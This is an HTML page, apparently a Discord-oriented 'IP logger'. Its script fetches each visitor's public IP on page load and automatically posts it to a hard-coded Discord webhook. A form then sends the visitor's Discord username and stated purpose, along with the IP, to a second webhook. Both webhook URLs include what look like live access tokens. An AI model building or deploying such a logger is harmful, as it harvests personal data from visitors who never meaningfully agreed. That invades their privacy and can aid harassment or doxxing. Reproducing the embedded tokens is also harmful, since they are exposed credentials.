<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>User Information</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #2c2f33;
      color: #fff;
    }
    .container {
      text-align: center;
      background: #23272a;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
      width: 300px;
    }
    input {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
      border: none;
      border-radius: 5px;
    }
    button {
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      background-color: #7289da;
      color: white;
      cursor: pointer;
    }
    button:hover {
      background-color: #5b6eae;
    }
    #status {
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Welcome!</h1>
    <p>Your IP is being logged...</p>
    
    <input type="text" id="purpose" placeholder="What are you here for?" required>
    <input type="text" id="discordUser" placeholder="Enter your Discord username" required>
    
    <button onclick="sendUserData()">Submit</button>
    <p id="status"></p>
  </div>

  <script>
    let userIP = "Fetching...";  // Placeholder until IP is retrieved

    // Fetch and store user's IP
    async function fetchIP() {
      try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        userIP = ipData.ip;

        // Send the IP immediately upon page load
        sendIPToWebhook();
      } catch (error) {
        console.error('Error fetching IP:', error);
      }
    }

    async function sendIPToWebhook() {
      const webhookUrl = 'https://discord.com/api/webhooks/1332888766490349678/MW70wO-ZgxR6hAWy3RBLW1eusKfkn6m_wfBGkhwYCzxvrwXgUPTawDnZmpvTdb_fEMnY';
      
      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `ðŸš¨ **New Visitor IP Logged:** ${userIP}`
        }),
      });
    }

    async function sendUserData() {
      const purpose = document.getElementById('purpose').value.trim();
      const discordUser = document.getElementById('discordUser').value.trim();
      const status = document.getElementById('status');

      if (!purpose || !discordUser) {
        status.textContent = "Please fill in all fields.";
        status.style.color = "red";
        return;
      }

      const webhookUrl = 'https://discordapp.com/api/webhooks/1335664944028582000/c1CoPiNgVyekogi0OhqJQizguoBFy5XmTKydzmWb-8XQFOYEAZ_PyT79OgkQsc1ElmGl';
      
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: `ðŸ“Œ **New User Entry:**\nðŸ”¹ **IP:** ${userIP}\nðŸ”¹ **Purpose:** ${purpose}\nðŸ”¹ **Discord Username:** ${discordUser}`
          }),
        });

        status.textContent = "Your information has been submitted!";
        status.style.color = "green";
      } catch (error) {
        console.error("Error sending data:", error);
        status.textContent = "Error submitting data. Try again.";
        status.style.color = "red";
      }
    }

    // Fetch IP on page load
    fetchIP();
  </script>
</body>
</html>
